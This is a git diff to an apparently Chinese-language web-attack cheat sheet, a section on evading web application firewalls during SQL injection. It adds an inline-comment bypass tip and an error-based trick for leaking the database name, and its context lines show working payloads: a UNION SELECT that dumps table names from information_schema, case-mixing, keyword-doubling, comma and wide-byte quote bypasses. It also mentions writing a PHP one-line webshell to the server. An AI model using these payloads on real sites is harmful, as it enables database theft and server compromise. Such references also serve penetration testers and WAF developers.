@@ -166,7 +166,7 @@ WAF is a defender for web.
   - ```大小寫混淆 e.g. SelecT```  
 - 雙關鍵字繞過  
   - ```UNIunionON```  
-- 內聯注釋繞過  
+- 內聯注釋繞過(**聽說這招可以繞過很多WAF，用注釋符替換空白以及作結，還可以用單個```*/```去閉合多個```/*!```**)  
   - ```id=1/*!UnIoN*/+SeLeCT+1,2,concat(/*!table_name*/)+FrOM /*information_schema*/.tables /*!WHERE*/+/*!TaBlE_ScHeMa*/+like+database()#```
 - 逗號繞過  
   - ```union select 1,2,3``` -> ```union select * from ((select 1)a join (select 2)b join (select 3)c);```   
@@ -189,6 +189,9 @@ WAF is a defender for web.
   - ```and/or``` -> ```&& / |```  
 - 寬字節繞過  
   - 過濾單引號： ```%bf%27 %df%27 %aa%27```  
+- ```information_schema```等關鍵字被禁掉  
+  - 爆庫名：```select * from users where name = helloworld();```  
+    原理：```ERROR 1305 (42000): FUNCTION CODINGGROUND.helloworld does not exist```
 
 ### Dump file
 將查詢結果放到文件中, 或者將一句話木馬放到系統上的php文件中  
